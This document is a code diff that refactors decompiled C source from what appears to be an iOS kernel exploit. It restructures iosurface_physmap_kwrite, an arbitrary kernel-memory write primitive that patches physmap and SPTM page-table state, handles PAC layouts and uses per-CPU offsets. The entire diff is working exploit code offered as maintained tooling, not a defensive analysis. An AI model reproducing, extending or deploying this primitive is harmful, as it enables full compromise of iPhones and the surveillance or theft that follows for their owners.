@@ -96,81 +96,118 @@ bool __fastcall noppl_kwrite32(struct_krwCtx *krwCtx, mach_vm_address_t address,
   return rawStatus == 0;
 }
 
+static uint64_t iosurface_physmap_cpu_state_offset(struct_krwCtx *krwCtx)
+{
+  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A17) )
+    return 224;
+  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11_TO_A17_OR_SELF_TASK_PORT_MASK) )
+    return 144;
+  return 216;
+}
+
+static __int64 iosurface_physmap_wait_for_helper(uint64_t iokitState)
+{
+  uint64_t oldGeneration = *(uint64_t *)(iokitState + 64);
+  if ( __ulock_wake(0x201u, (void *)(iokitState + 52), *(uint32_t *)(iokitState + 48)) )
+  {
+    int err = errno;
+    if ( err < 0 )
+      err = -err;
+    return err | 0x40000000u;
+  }
+
+  if ( oldGeneration != *(uint64_t *)(iokitState + 64) )
+    return 0;
+
+  for ( uint32_t attempt = 0; attempt != 1001; ++attempt )
+  {
+    thread_switch(*(uint32_t *)(iokitState + 48), 2, attempt > 8);
+    if ( oldGeneration != *(uint64_t *)(iokitState + 64) )
+      return 0;
+  }
+  return 4097;
+}
+
+static __int64 iosurface_physmap_kwrite_unaligned(
+        struct_krwCtx *krwCtx,
+        uint64_t vaddr,
+        __int64 inBuf,
+        uint32_t size,
+        int openDevNull)
+{
+  __int64 status = 708609;
+  int fd = -1;
+
+  if ( krwCtx->threadForKernelRead + 1 < 2 || !krwCtx->threadStateKrwPhysAddr )
+    return status;
+  if ( !check_kaddr_in_physmap(krwCtx, vaddr) )
+    return status;
+
+  if ( openDevNull )
+  {
+    status = fd_open_dev_null(&fd);
+    if ( (uint32_t)status )
+      return status;
+  }
+
+  uint32_t offset = 0;
+  while ( offset < size )
+  {
+    uint64_t currentVaddr = vaddr + offset;
+    uint64_t byteOffset = currentVaddr & 7;
+    uint64_t alignedVaddr = currentVaddr - byteOffset;
+    uint64_t mergedValue = 0;
+    status = kreadbuf_via_dev_null_and_thread_state(krwCtx, alignedVaddr, (__int64)&mergedValue, 8u, 0);
+    if ( (uint32_t)status )
+    {
+      TRACE_PORTS("iosurface_physmap_kwrite unaligned read failed raw=%x aligned=%llx off=%llx\n",
+                  (unsigned int)status,
+                  (unsigned long long)alignedVaddr,
+                  (unsigned long long)byteOffset);
+      break;
+    }
+
+    size_t bytesThisWord = 8 - byteOffset >= (uint64_t)(size - offset) ? size - offset : 8 - byteOffset;
+    uint64_t oldValue = mergedValue;
+    memcpy((char *)&mergedValue + byteOffset, (const void *)(inBuf + offset), bytesThisWord);
+    if ( oldValue != mergedValue )
+    {
+      status = ioconnect_struct_method_kwrite(krwCtx, alignedVaddr, mergedValue);
+      if ( (uint32_t)status )
+      {
+        TRACE_PORTS("iosurface_physmap_kwrite unaligned write failed raw=%x aligned=%llx value=%llx\n",
+                    (unsigned int)status,
+                    (unsigned long long)alignedVaddr,
+                    (unsigned long long)mergedValue);
+        break;
+      }
+    }
+
+    offset = offset - byteOffset + 8;
+  }
+
+  if ( offset >= size )
+    status = 0;
+  if ( fd != -1 )
+    fd_close(fd);
+  return status;
+}
+
 //----- (0000000000028F90) ----------------------------------------------------
 __int64 __fastcall iosurface_physmap_kwrite(struct_krwCtx *krwCtx, unsigned __int64 a2, __int64 a3, unsigned int a4, int a5)
 {
-  __int64 v5; // x25
-  uint64_t IOKitConnInfo; // x8
-  unsigned int v8; // w26
-  unsigned int v12; // w24
-  __int64 v13; // x8
-  __int64 v14; // x21
-  unsigned __int64 v15; // x23
-  __int64 v16; // x0
-  size_t v17; // x2
-  __int64 v18; // x25
-  unsigned int v19; // w28
-  unsigned __int64 v20; // x19
-  unsigned __int64 v21; // x8
-  __int64 v22; // x20
-  unsigned int v23; // w21
-  unsigned __int64 v24; // x24
-  __int64 v25; // x0
-  size_t v26; // x2
-  int v27; // w19
-  int v28; // w23
-  vm_size_t v29; // x20
-  __int64 v30; // x21
-  uint64_t v31; // x26
-  int v32; // w9
-  __int64 v33; // x8
-  __int64 v34; // x9
-  __int64 v35; // x19
-  __int64 *v36; // x27
-  int v37; // w20
-  unsigned __int64 v38; // x1
-  __int64 v39; // x0
-  __int64 paddr; // x0
-  __int64 v41; // x19
-  vm_address_t v42; // x8
-  int v43; // w9
-  bool v44; // zf
-  __int64 v45; // x0
-  __int64 v46; // x0
-  int v47; // w8
-  __int64 v48; // x19
-  int v49; // w8
-  unsigned int v50; // w8
-  unsigned int v51; // w20
-  __int64 v52; // x0
-  __int64 v53; // x0
-  int v54; // w0
-  vm_size_t v56; // [xsp+8h] [xbp-B8h]
-  unsigned __int64 v57; // [xsp+10h] [xbp-B0h]
-  __int64 v58; // [xsp+18h] [xbp-A8h]
-  unsigned int v59; // [xsp+24h] [xbp-9Ch]
-  unsigned __int64 v60; // [xsp+28h] [xbp-98h]
-  unsigned __int64 v61; // [xsp+30h] [xbp-90h]
-  unsigned int v62; // [xsp+38h] [xbp-88h]
-  int v63; // [xsp+40h] [xbp-80h] BYREF
-  int v64; // [xsp+44h] [xbp-7Ch] BYREF
-  int v65; // [xsp+48h] [xbp-78h] BYREF
-  int v66; // [xsp+4Ch] [xbp-74h] BYREF
-  unsigned __int64 v67; // [xsp+50h] [xbp-70h] BYREF
-  __int64 v68; // [xsp+58h] [xbp-68h] BYREF
-  vm_address_t address; // [xsp+60h] [xbp-60h] BYREF
-  unsigned __int64 v70; // [xsp+68h] [xbp-58h] BYREF
+  __int64 status = 708609;
+  uint64_t IOKitConnInfo = krwCtx->IOKitConnInfo;
 
-  v5 = 708609;
-  IOKitConnInfo = krwCtx->IOKitConnInfo;
   if ( !IOKitConnInfo )
   {
     TRACE_PORTS("iosurface_physmap_kwrite no state ctx=%llx addr=%llx size=%u\n",
-                (unsigned long long)a1,
+                (unsigned long long)krwCtx,
                 (unsigned long long)a2,
                 a4);
-    return v5;
+    return status;
   }
+
   TRACE_PORTS("iosurface_physmap_kwrite enter ctx=%llx addr=%llx buf=%llx size=%u a5=%d state=%llx flags=%x byte4a=%u thread=%d ptr=%llx\n",
               (unsigned long long)krwCtx,
               (unsigned long long)a2,
@@ -181,351 +218,222 @@ __int64 __fastcall iosurface_physmap_kwrite(struct_krwCtx *krwCtx, unsigned __in
               krwCtx->flags,
               *(unsigned __int8 *)(IOKitConnInfo + 74),
               krwCtx->threadForKernelRead,
-              (unsigned long long)*(uint64_t *)&krwCtx->threadStateKrwPhysAddr);
-  v8 = a4;
+              (unsigned long long)krwCtx->threadStateKrwPhysAddr);
+
   if ( ((a2 & 3) != 0 || a4 != 4) && *(uint8_t *)(IOKitConnInfo + 74) )
   {
-    if ( krwCtx->threadForKernelRead + 1 >= 2 )
-    {
-      if ( *(uint64_t *)&krwCtx->threadStateKrwPhysAddr )
-      {
-        if ( check_kaddr_in_physmap(krwCtx, a2) )
-        {
-          LODWORD(address) = -1;
-          if ( !a5 || (v5 = fd_open_dev_null((int *)&address), !(uint32_t)v5) )
-          {
-            if ( v8 )
-            {
-              v12 = 0;
-              while ( 1 )
-              {
-                v70 = 0;
-                v13 = a2 + v12;
-                v14 = v13 & 7;
-                v15 = v13 - v14;
-                v16 = kreadbuf_via_dev_null_and_thread_state(krwCtx, v13 - v14, (__int64)&v70, 8u, 0);
-                if ( (uint32_t)v16 )
-                {
-                  TRACE_PORTS("iosurface_physmap_kwrite unaligned read failed raw=%x aligned=%llx off=%llx\n",
-                              (unsigned int)v16,
-                              (unsigned long long)v15,
-                              (unsigned long long)v14);
-                  break;
-                }
-                v17 = 8 - v14 >= (unsigned __int64)(v8 - v12) ? v8 - v12 : 8 - v14;
-                v18 = v70;
-                memcpy((void *)((unsigned __int64)&v70 | v14), (const void *)(a3 + v12), v17);
-                if ( v18 != v70 )
-                {
-                  v16 = ioconnect_struct_method_kwrite(krwCtx, v15, v70);
-                  if ( (uint32_t)v16 )
-                  {
-                    TRACE_PORTS("iosurface_physmap_kwrite unaligned write failed raw=%x aligned=%llx value=%llx\n",
-                                (unsigned int)v16,
-                                (unsigned long long)v15,
-                                (unsigned long long)v70);
-                    break;
-                  }
-                }
-                v12 = v12 - v14 + 8;
-                if ( v12 >= v8 )
-                  goto LABEL_19;
-              }
-              v5 = v16;
-            }
-            else
-            {
-LABEL_19:
-              v5 = 0;
-            }
-            v54 = address;
-            goto LABEL_100;
-          }
-        }
-      }
-    }
-    return v5;
+    status = iosurface_physmap_kwrite_unaligned(krwCtx, a2, a3, a4, a5);
+    TRACE_PORTS("iosurface_physmap_kwrite exit raw=%llx\n", (unsigned long long)status);
+    return status;
   }
+
   if ( !check_kaddr_in_physmap(krwCtx, a2) )
   {
     TRACE_PORTS("iosurface_physmap_kwrite validate failed addr=%llx\n", (unsigned long long)a2);
-    return v5;
+    return status;
   }
-  v64 = -1;
+
+  int fd = -1;
   if ( a5 )
   {
-    v5 = fd_open_dev_null(&v64);
-    if ( (uint32_t)v5 )
-      return v5;
+    status = fd_open_dev_null(&fd);
+    if ( (uint32_t)status )
+      return status;
   }
-  if ( !v8 )
-    goto LABEL_97;
-  v61 = a2;
-  v19 = 0;
-  v59 = v8;
-  v58 = a3;
-LABEL_25:
-  v20 = v8 - v19;
-  v63 = 0;
-  v21 = v61 + v19;
-  if ( (unsigned int)v20 >= 4 )
+
+  uint32_t offset = 0;
+  while ( offset < a4 )
   {
-    v23 = 0;
-    v22 = v19;
-  }
-  else
-  {
-    v22 = v19;
-    if ( (((v21 + (unsigned int)v20 - 1) ^ (v21 + 3)) & ~krwCtx->pageMask) != 0 )
-      v23 = 4 - v20;
-    else
-      v23 = 0;
-  }
-  v24 = v21 - v23;
-  v25 = kreadbuf_via_dev_null_and_thread_state(krwCtx, v24, (__int64)&v63, 4u, 0);
-  if ( !(uint32_t)v25 )
-  {
-    if ( 4 - (unsigned __int64)v23 >= v20 )
-      v26 = v8 - v19;
-    else
-      v26 = 4LL - v23;
-    v27 = v63;
-    memcpy((char *)&v63 + v23, (const void *)(a3 + v22), v26);
-    v28 = v63;
-    v62 = v23;
-    if ( v27 == v63 )
-      goto LABEL_72;
+    uint32_t remaining = a4 - offset;
+    uint64_t currentVaddr = a2 + offset;
+    uint32_t prepad = 0;
+    if ( remaining < 4 && (((currentVaddr + remaining - 1) ^ (currentVaddr + 3)) & ~krwCtx->pageMask) != 0 )
+      prepad = 4 - remaining;
+
+    uint64_t writeBase = currentVaddr - prepad;
+    int oldWord = 0;
+    status = kreadbuf_via_dev_null_and_thread_state(krwCtx, writeBase, (__int64)&oldWord, 4u, 0);
+    if ( (uint32_t)status )
+    {
+      TRACE_PORTS("iosurface_physmap_kwrite pre-read failed raw=%llx addr=%llx base=%llx\n",
+                  (unsigned long long)status,
+                  (unsigned long long)currentVaddr,
+                  (unsigned long long)writeBase);
+      break;
+    }
+
+    size_t bytesToPatch = 4 - (uint64_t)prepad >= remaining ? remaining : 4 - prepad;
+    int patchedWord = oldWord;
+    memcpy((char *)&patchedWord + prepad, (const void *)(a3 + offset), bytesToPatch);
+    if ( oldWord == patchedWord )
+    {
+      offset = offset - prepad + 4;
+      continue;
+    }
+
     TRACE_PORTS("iosurface_physmap_kwrite aligned chunk addr=%llx base=%llx old=%x new=%x off=%u left=%llu\n",
-                (unsigned long long)v21,
-                (unsigned long long)v24,
-                v27,
-                v63,
-                v23,
-                (unsigned long long)v20);
-    v70 = v24;
-    address = 0;
-    v29 = vm_page_size;
-    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A17) )
-    {
-      v30 = 224;
-    }
-    else if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11_TO_A17_OR_SELF_TASK_PORT_MASK) )
-    {
-      v30 = 144;
-    }
-    else
-    {
-      v30 = 216;
-    }
-    v31 = krwCtx->IOKitConnInfo;
-    v5 = 708609;
-    if ( !v31 )
+                (unsigned long long)currentVaddr,
+                (unsigned long long)writeBase,
+                oldWord,
+                patchedWord,
+                prepad,
+                (unsigned long long)remaining);
+
+    uint64_t targetWriteBase = writeBase;
+    vm_address_t mappedAddress = 0;
+    vm_size_t mappedSize = vm_page_size;
+    uint64_t state = krwCtx->IOKitConnInfo;
+    status = 708609;
+    if ( !state )
     {
       TRACE_PORTS("iosurface_physmap_kwrite missing IOKitConnInfo during chunk\n");
-      goto LABEL_66;
+      goto chunk_cleanup;
     }
-    v32 = *(uint32_t *)(v31 + 56);
-    v5 = 708609;
-    if ( !v32 )
+
+    uint32_t stateIndex = *(uint32_t *)(state + 56);
+    if ( !stateIndex )
     {
       TRACE_PORTS("iosurface_physmap_kwrite missing state[56]\n");
-      goto LABEL_66;
+      goto chunk_cleanup;
     }
-    v33 = *(uint64_t *)(v31 + 8);
-    v5 = 708609;
-    if ( !v33 )
+
+    uint64_t sharedStateBase = *(uint64_t *)(state + 8);
+    if ( !sharedStateBase )
     {
       TRACE_PORTS("iosurface_physmap_kwrite missing state[8]\n");
-      goto LABEL_66;
+      goto chunk_cleanup;
     }
-    v34 = (unsigned int)(v32 + 96);
-    v35 = *(uint64_t *)(v31 + 32);
-    v60 = v33 + v34;
-    v56 = v29;
-    v57 = v33 + v30;
-    v36 = (__int64 *)(v35 + v34);
-    v37 = 11;
-    while ( 1 )
+
+    uint64_t stateEntryOffset = (uint32_t)(stateIndex + 96);
+    uint64_t stateEntryKaddr = sharedStateBase + stateEntryOffset;
+    uint64_t perCpuStateKaddr = sharedStateBase + iosurface_physmap_cpu_state_offset(krwCtx);
+    uint64_t *stateEntrySlot = (uint64_t *)(*(uint64_t *)(state + 32) + stateEntryOffset);
+    bool newPacLayout = krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(10002, 60, 75, 0, 2)
+                     && (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0;
+
+    status = 163878;
+    for ( int attempt = 11; attempt; --attempt )
     {
-      if ( v37 != 11 )
-        thread_switch(*(uint32_t *)(v31 + 48), 2, 0xAu);
-      if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(10002, 60, 75, 0, 2) && (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 )
+      uint64_t stateAddrA = 0;
+      uint64_t stateAddrB = 0;
+
+      if ( attempt != 11 )
+        thread_switch(*(uint32_t *)(state + 48), 2, 0xAu);
+
+      if ( newPacLayout )
       {
-        v68 = 0;
-        v39 = read_via_mapped_physmem_region(krwCtx, v60, &v68, krwCtx->stride_0x168, 0);
-        if ( (uint32_t)v39 )
-          goto LABEL_64;
-        if ( !validate_kaddr_range(krwCtx, v68) )
-          goto LABEL_55;
-        v67 = 0;
-        v39 = read_via_mapped_physmem_region(krwCtx, v57, &v67, krwCtx->stride_0x168, 0);
-        if ( (uint32_t)v39 )
-        {
-LABEL_64:
-          v5 = v39;
-          goto LABEL_65;
-        }
-        v38 = v67;
+        status = read_via_mapped_physmem_region(krwCtx, stateEntryKaddr, &stateAddrA, krwCtx->stride_0x168, 0);
+        if ( (uint32_t)status )
+          break;
+        if ( !validate_kaddr_range(krwCtx, stateAddrA) )
+          continue;
+        status = read_via_mapped_physmem_region(krwCtx, perCpuStateKaddr, &stateAddrB, krwCtx->stride_0x168, 0);
+        if ( (uint32_t)status )
+          break;
       }
       else
       {
-        v68 = *v36;
-        if ( !validate_kaddr_range(krwCtx, v68) )
-          goto LABEL_55;
-        v38 = *(uint64_t *)(v35 + v30);
-        v67 = v38;
+        stateAddrA = *stateEntrySlot;
+        if ( !validate_kaddr_range(krwCtx, stateAddrA) )
+          continue;
+        stateAddrB = *(uint64_t *)(*(uint64_t *)(state + 32) + iosurface_physmap_cpu_state_offset(krwCtx));
       }
-      if ( v38 == v68 )
+
+      if ( stateAddrA != stateAddrB )
+        continue;
+
+      uint64_t paddr = find_sptm_pgtable_state_block(krwCtx, stateAddrB, 0);
+      if ( !paddr )
       {
-        paddr = find_sptm_pgtable_state_block(krwCtx, v38, 0);
-        v29 = v56;
-        if ( !paddr )
+        status = 163878;
+        break;
+      }
+
+      if ( newPacLayout )
+      {
+        int stateWord = 0;
+        status = read_via_mapped_physmem_region(krwCtx, paddr + 52, &stateWord, 4u, 0);
+        if ( (uint32_t)status )
+          break;
+        if ( stateWord != 1 )
         {
-          v5 = 163878;
-          goto LABEL_66;
+          status = 163857;
+          break;
         }
-        v41 = paddr;
-        if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(10002, 60, 75, 0, 2) && (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 )
+
+        int mode;
+        if ( patchedWord )
         {
-          v45 = read_via_mapped_physmem_region(krwCtx, paddr + 52, &v65, 4u, 0);
-          v5 = v45;
-          if ( (uint32_t)v45 )
-            goto LABEL_66;
-          v5 = 163857;
-          if ( v65 != 1 )
-            goto LABEL_66;
-          if ( v28 )
-          {
-            v65 = v28 + 1;
-            v46 = physwritebuf_direct_mapped(krwCtx, v41 + 52, &v65, 4u, 0);
-            v5 = v46;
-            if ( (uint32_t)v46 )
-              goto LABEL_66;
-            v47 = 1;
-          }
-          else
-          {
-            v47 = 2;
-          }
-          v66 = v47;
-          v52 = physwritebuf_direct_mapped(krwCtx, v41 + 56, &v66, 4u, 0);
-          v5 = v52;
-          if ( !(uint32_t)v52 )
-          {
-            v53 = physwritebuf_direct_mapped(krwCtx, v60 + 24, &v70, krwCtx->stride_0x168, 0);
-            v5 = v53;
-            if ( !(uint32_t)v53 )
-            {
-LABEL_82:
-              v48 = *(uint64_t *)(v31 + 64);
-              if ( (unsigned int)__ulock_wake(0x201u, (void *)(v31 + 52), *(unsigned int *)(v31 + 48)) )
-              {
-                v49 = errno;
-                if ( v49 < 0 )
-                  v49 = -v49;
-                v5 = v49 | 0x40000000u;
-              }
-              else if ( v48 == *(uint64_t *)(v31 + 64) )
-              {
-                v50 = 0;
-                while ( v50 != 1001 )
-                {
-                  v51 = v50 + 1;
-                  thread_switch(*(uint32_t *)(v31 + 48), 2, v50 > 8);
-                  v5 = 0;
-                  v50 = v51;
-                  v29 = v56;
-                  if ( v48 != *(uint64_t *)(v31 + 64) )
-                    goto LABEL_66;
-                }
-                v5 = 4097;
-              }
-              else
-              {
-                v5 = 0;
-              }
-            }
-          }
+          stateWord = patchedWord + 1;
+          status = physwritebuf_direct_mapped(krwCtx, paddr + 52, &stateWord, 4u, 0);
+          if ( (uint32_t)status )
+            break;
+          mode = 1;
         }
         else
         {
-          v5 = physmap_maybe(krwCtx, &address, v56, paddr);
-          if ( !(uint32_t)v5 )
-          {
-            v42 = (krwCtx->pageMask & v68) + address;
-            v65 = *(uint32_t *)(v42 + 52);
-            v5 = 163857;
-            if ( v65 == 1 )
-            {
-              if ( v28 )
-              {
-                *(uint32_t *)(v42 + 52) = v28 + 1;
-                v43 = 1;
-              }
-              else
-              {
-                v43 = 2;
-              }
-              v66 = v43;
-              *(uint32_t *)(v42 + 56) = v43;
-              v36[3] = v24;
-              goto LABEL_82;
-            }
-          }
+          mode = 2;
         }
-LABEL_66:
-        TRACE_PORTS("iosurface_physmap_kwrite chunk cleanup err=%llx addr=%llx physmap=%llx\n",
-                    (unsigned long long)v5,
-                    (unsigned long long)v24,
-                    (unsigned long long)address);
-        if ( address )
-          v44 = v29 == 0;
-        else
-          v44 = 1;
-        if ( !v44 )
-          vm_deallocate(mach_task_self_, address, v29);
-        v8 = v59;
-        a3 = v58;
-        if ( (uint32_t)v5 )
-          goto LABEL_99;
-LABEL_72:
-        v19 = v19 - v62 + 4;
-        if ( v19 >= v8 )
-        {
-LABEL_97:
-          v5 = 0;
-          goto LABEL_99;
-        }
-        goto LABEL_25;
+
+        status = physwritebuf_direct_mapped(krwCtx, paddr + 56, &mode, 4u, 0);
+        if ( (uint32_t)status )
+          break;
+        status = physwritebuf_direct_mapped(krwCtx, stateEntryKaddr + 24, &targetWriteBase, krwCtx->stride_0x168, 0);
+        if ( (uint32_t)status )
+          break;
       }
-LABEL_55:
-      if ( !--v37 )
+      else
       {
-        v5 = 163878;
-LABEL_65:
-        v29 = v56;
-        goto LABEL_66;
+        status = physmap_maybe(krwCtx, &mappedAddress, mappedSize, paddr);
+        if ( (uint32_t)status )
+          break;
+
+        uint64_t mappedState = (krwCtx->pageMask & stateAddrA) + mappedAddress;
+        int stateWord = *(uint32_t *)(mappedState + 52);
+        if ( stateWord != 1 )
+        {
+          status = 163857;
+          break;
+        }
+
+        int mode;
+        if ( patchedWord )
+        {
+          *(uint32_t *)(mappedState + 52) = patchedWord + 1;
+          mode = 1;
+        }
+        else
+        {
+          mode = 2;
+        }
+        *(uint32_t *)(mappedState + 56) = mode;
+        stateEntrySlot[3] = targetWriteBase;
       }
+
+      status = iosurface_physmap_wait_for_helper(state);
+      break;
     }
+
+chunk_cleanup:
+    TRACE_PORTS("iosurface_physmap_kwrite chunk cleanup err=%llx addr=%llx physmap=%llx\n",
+                (unsigned long long)status,
+                (unsigned long long)writeBase,
+                (unsigned long long)mappedAddress);
+    if ( mappedAddress && mappedSize )
+      vm_deallocate(mach_task_self_, mappedAddress, mappedSize);
+    if ( (uint32_t)status )
+      break;
+
+    offset = offset - prepad + 4;
   }
-  v5 = v25;
-  TRACE_PORTS("iosurface_physmap_kwrite pre-read failed raw=%llx addr=%llx base=%llx\n",
-              (unsigned long long)v5,
-              (unsigned long long)v21,
-              (unsigned long long)v24);
-LABEL_99:
-  v54 = v64;
-LABEL_100:
-  if ( v54 != -1 )
-    fd_close(v54);
-  TRACE_PORTS("iosurface_physmap_kwrite exit raw=%llx\n", (unsigned long long)v5);
-  return v5;
+
+  if ( offset >= a4 )
+    status = 0;
+  if ( fd != -1 )
+    fd_close(fd);
+  TRACE_PORTS("iosurface_physmap_kwrite exit raw=%llx\n", (unsigned long long)status);
+  return status;
 }
-// 292C0: variable 'v39' is possibly undefined
-// 2942C: variable 'v45' is possibly undefined
-// 2946C: variable 'v46' is possibly undefined
-// 29530: variable 'v52' is possibly undefined
-// 29554: variable 'v53' is possibly undefined
 
 //----- (00000000000295B4) ----------------------------------------------------
 bool __fastcall kread_u32(struct_krwCtx *krwCtx, unsigned __int64 vaddr, void *outBuf)
